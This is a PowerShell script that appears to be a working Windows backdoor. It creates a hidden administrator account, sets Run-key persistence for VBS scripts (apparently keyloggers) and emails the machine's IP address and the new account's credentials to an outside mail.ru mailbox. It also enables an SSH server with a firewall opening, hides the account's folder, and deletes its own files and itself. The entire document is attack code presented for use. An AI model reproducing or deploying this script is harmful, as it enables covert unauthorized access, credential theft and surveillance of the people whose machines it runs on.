# Randomly generated chars for temp dir and dir's for vbs and reg scripts
$temp_dir = (-join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_}))


$global:mail_attach = "$env:Username.cfg"


# Email cred's
$global:email = (Get-Content ./7r6lYgoLlv.txt).Trim()
$global:emailp = (Get-Content ./OWEeX45e3U.txt).Trim()
$global:emailp = (ConvertTo-SecureString -String $emailp -AsPlainText -Force)


# Vars for mail
$global:addr = ((Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias Ethernet).IPAddress)
$global:user = (Get-Content ./etgtYmwQUO.txt).Trim()
$global:p_plain = (Get-Content ./f4EWj29Hgq.txt).Trim()
$global:p = (ConvertTo-SecureString -String $p_plain -AsPlainText -Force)


# Populating file for mail
Add-Content -Path .\$mail_attach -Value $addr
Add-Content -Path .\$mail_attach -Value $user
Add-Content -Path .\$mail_attach -Value $p_plain
Add-Content -Path .\$mail_attach -Value $temp_dir


# Local user for "something" and "then excluding them from log in page"
New-LocalUser $user -Password $p -FullName $user -Description $user
Add-LocalGroupMember -Group "Administrators" -Member $user

# For user
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v $user

# K_dir #ADD ME TO INIT.CMD
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "k" /t REG_SZ /d "wscript.exe `"`"C:\Users\$($env:Username)\AppData\Local\Temp\$($temp_dir)\k.vbs`"`"" /f
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "ke" /t REG_SZ /d "wscript.exe `"`"C:\Users\$($env:Username)\AppData\Local\Temp\$($temp_dir)\ke.vbs`"`"" /f

# Yeah...
Send-MailMessage -From $email -To $email -Subject "test3" -Attachment .\$mail_attach -SmtpServer smtp.mail.ru -Port 587 -UseSsl -Credential (New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $email, $emailp)


# Open SSH and port 22 (add a rule in firewall as well)
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'
if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) {
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22
}


# Watching
mkdir $env:Temp/$temp_dir
[bool] $global:undone = $true


$watcher = New-Object System.IO.FileSystemWatcher
$watcher.Path = "C:\Users"
$watcher.Filter = "*.*"
$watcher.IncludeSubdirectories = $false
$watcher.EnableRaisingEvents = $true

# *Woop*
$action = { $path = $Event.SourceEventArgs.FullPath
            $changeType = $Event.SourceEventArgs.ChangeType
            attrib +h +s +r C:\Users\$user
            echo "hi" > .\hi.txt
}

# If the folder is created
Register-ObjectEvent $watcher "Created" -Action $action

# Give time to local user
while($undone) {
  Start-Sleep -Seconds 100
  $undone = $false
}



Remove-Item .\7r6lYgoLlv.txt
Remove-Item .\etgtYmwQUO.txt
Remove-Item .\f4EWj29Hgq.txt
Remove-Item .\OWEeX45e3U.txt
Remove-Item .\$mail_attach
Remove-Item $PSCommandPath -Force
